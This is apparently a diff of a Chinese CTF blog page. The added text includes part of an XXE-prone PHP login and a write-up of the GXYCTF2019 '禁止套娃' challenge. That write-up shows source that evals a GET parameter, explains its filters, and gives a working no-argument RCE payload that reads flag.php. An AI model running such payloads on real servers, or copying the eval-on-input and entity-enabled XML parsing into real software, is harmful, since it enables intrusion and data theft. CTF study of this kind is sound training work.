+	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+	$creds = simplexml_import_dom($dom);
+
+	$username = $creds-&gt;username;
+	$password = $creds-&gt;password;
+
+	<span class="hljs-keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;
+		$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">1</span>,$username);
+	&#125;<span class="hljs-keyword">else</span>&#123;
+		$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">0</span>,$username);
+	&#125;	
+&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-keyword">Exception</span> $e)&#123;
+	$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">3</span>,$e-&gt;getMessage());
+&#125;
+
+header(<span class="hljs-string">'Content-Type: text/html; charset=utf-8'</span>);
+<span class="hljs-keyword">echo</span> $result;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+
+
+<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>.git源码泄露</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag在哪里呢？&lt;br&gt;"</span>;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'exp'</span>]))&#123;
+    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-string">';'</span> === preg_replace(<span class="hljs-string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="hljs-keyword">NULL</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
+            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
+                <span class="hljs-comment">// echo $_GET['exp'];</span>
+                @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'exp'</span>]);
+            &#125;
+            <span class="hljs-keyword">else</span>&#123;
+                <span class="hljs-keyword">die</span>(<span class="hljs-string">"还差一点哦！"</span>);
+            &#125;
+        &#125;
+        <span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">"再好好想想！"</span>);
+        &#125;
+    &#125;
+    <span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">"还想读flag，臭弟弟！"</span>);
+    &#125;
+&#125;
+<span class="hljs-comment">// highlight_file(__FILE__);</span>
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>第一个<code>if</code>：常用的伪协议被禁了</p>
+<p>第二个<code>if</code>正则匹配，<code>?R</code> 表示引用当前表达式，就比如引用一次：<br><code>[a-z,_]+[a-z,_]+\((?R)?\)</code>，所以一个合法的表达式可以是<code>a(b();)</code>，括号和字符组成的</p>
+<p>第三个<code>if</code>就过滤一些函数包含的字符，导致了许多函数无法使用。</p>
+<blockquote>
+<p>1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。 </p>
+<p>2.过滤了常用的几个伪协议，不能以伪协议读取文件。 </p>
+<p>3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。 </p>
+<p>4.正则匹配掉了et/na/info等关键字，很多函数都用不了。</p>
+<p> 5：eval($_GET[‘exp’]); </p>
+</blockquote>
+<p>考察点无参RCE</p>
+<p>exp：</p>
+<div class="hljs"><pre><code class="hljs reasonml">?exp=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));</code></pre></div>
+
+<p>这里用到反转函数是因为，flag.php在倒数第二个位置，无法使用end()获取，反转后可以直接受用next()获取，方便很多。</p>
+<p><strong>localeconv()</strong> 函数返回一包含本地数字及货币格式信息的数组。</p>
+<p><strong>current()</strong> 函数返回数组中的当前元素的值。</p>
+<blockquote>
+<p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
+<p><strong>提示：</strong>该函数不会移动数组内部指针。要做到这一点，请使用 <a href="https://www.w3school.com.cn/php/func_array_krsort.asp" target="_blank" rel="noopener">next()</a> 和 <a href="https://www.w3school.com.cn/php/func_array_krsort.asp" target="_blank" rel="noopener">prev()</a> 函数。</p>
+<p>相关的方法：</p>
+<ul>
+<li><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> - 将内部指针指向数组中的最后一个元素，并输出</li>
+<li><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> - 将内部指针指向数组中的下一个元素，并输出</li>
+<li><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> - 将内部指针指向数组中的上一个元素，并输出</li>
+<li><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> - 将内部指针指向数组中的第一个元素，并输出</li>
+<li><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动</li>
+</ul>
+</blockquote>
+<p><strong>array_reverse()</strong> 函数以相反的元素顺序返回数组。</p>
+<p>array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。</p>
+<p>如果第二个参数指定为 true，则元素的键名保持不变，否则键名将丢失。</p>
+<p><a href="https://www.w3school.com.cn/php/func_array_reverse.asp" target="_blank" rel="noopener">详情</a></p>
+<p><strong>array_flip()</strong> 函数用于反转/交换数组中所有的键名以及它们关联的键值。</p>
+<p>array_flip() 函数返回一个反转后的数组，如果同一值出现了多次，则最后一个键名将作为它的值，所有其他的键名都将丢失。</p>
+<p>如果原数组中的值的数据类型不是字符串或整数，函数将报错。</p>
+
             </div>
             <hr>
             <div>
@@ -570,9 +915,13 @@ $a-&gt;func=<span class="hljs-string">"system"</span>;
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/htacess/">.htacess</a>
+                      <a class="hover-with-bg" href="/tags/md5/">md5</a>
                     
-                      <a class="hover-with-bg" href="/tags/user-ini/">.user.ini</a>
+                      <a class="hover-with-bg" href="/tags/system/">system</a>
+                    
+                      <a class="hover-with-bg" href="/tags/unserialize/">unserialize</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ssrf/">ssrf</a>
                     
                   </div>
                 
@@ -587,7 +936,7 @@ $a-&gt;func=<span class="hljs-string">"system"</span>;
                     
                       <a href="/2020/10/08/buuoj-upload/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">buuoj-upload</span>
+                        <span class="hidden-mobile">buuctf-upload</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -596,7 +945,7 @@ $a-&gt;func=<span class="hljs-string">"system"</span>;
                     
                     
                       <a href="/2020/10/05/buuoj/">
-                        <span class="hidden-mobile">buuoj-sql注入</span>
+                        <span class="hidden-mobile">buuctf-sql注入</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -796,11 +1145,11 @@ $a-&gt;func=<span class="hljs-string">"system"</span>;
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "buuoj-z7z8&nbsp;",
+        "buuctf-z7z8&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
-      loop: false,
+      loop: true,
     });
     typed.stop();
     $(document).ready(function () {
